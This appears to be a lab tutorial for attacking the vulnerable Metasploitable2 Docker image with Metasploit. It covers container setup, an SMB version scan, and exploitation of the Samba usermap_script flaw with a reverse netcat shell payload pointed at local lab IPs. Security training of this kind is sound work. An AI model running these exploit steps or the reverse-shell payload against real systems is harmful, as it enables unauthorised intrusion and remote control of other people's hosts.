# 1. Preparation
## Use Docker to run Metasploit

### Check Docker status
`docker --version`

# 2. Build attack target
### Download Metasploit2 
`docker pull tleemcjr/metasploitable2`

### Run Metasploit2 in Docker
- Enable metaspoilt module and keep running
    - `docker run -d --name vulnerable -p 445:445 -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2 bash -c "/bin/services.sh && tail -f /dev/null"`

- Get Target IP
    - `docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' vulnerable`

- Optional
    - `docker run -d --name vulnerable -p 445:445 -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2`

- Explanation of vulnerable
    - -p 445:445：開放 SMB（檔案共享漏洞）
    - -p 21:21：開放 FTP（容易被暴力破解）
    - -p 22:22：開放 SSH（可能存在弱密碼）
    - -p 80:80：開放 Web 服務（可能存在漏洞）

### Check Metasploit2 in Docker status
`docker ps`  # check docker status
`docker rm -f vulnerable`  # if docker exist, but didn't running then delete it.
`docker run -d --name vulnerable -p 445:445 -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2 bash -c "/bin/services.sh && tail -f /dev/null"` # rerun vul docker
`docker start vulnerable`  # rerun

# 3. Run attacker
### Run Metasploit in Docker
`docker run --rm -it metasploitframework/metasploit-framework  # delete when exit docker`
`help  # check metasploit status`

- Optional
`docker run -it --name metasploit metasploitframework/metasploit-framework  # keep docker container`
`docker start -ai metasploit  # run docker with next time`

# 4. Scan target system
- Enable metaspoilt moudle
    - `use exploit/multi/samba/usermap_script`

- In metaspoilt command line
    - `msf6 > use auxiliary/scanner/smb/smb_version`
    - `msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 172.17.0.2`
    - `msf6 auxiliary(scanner/smb/smb_version) > run`  # check port and vul

# 5. Exploit
- Load script
    - msf6 > `use exploit/multi/samba/usermap_script`

- Set target and payload
    - msf6 exploit(multi/samba/usermap_script) > `set RHOSTS 172.17.0.2`
    - msf6 exploit(multi/samba/usermap_script) > `check`
    - msf6 exploit(multi/samba/usermap_script) > `set PAYLOAD cmd/unix/reverse_netcat`

- Set reverse local host and attack
    - msf6 exploit(multi/samba/usermap_script) > `set LHOST 172.17.0.3`
    - msf6 exploit(multi/samba/usermap_script) > `exploit`

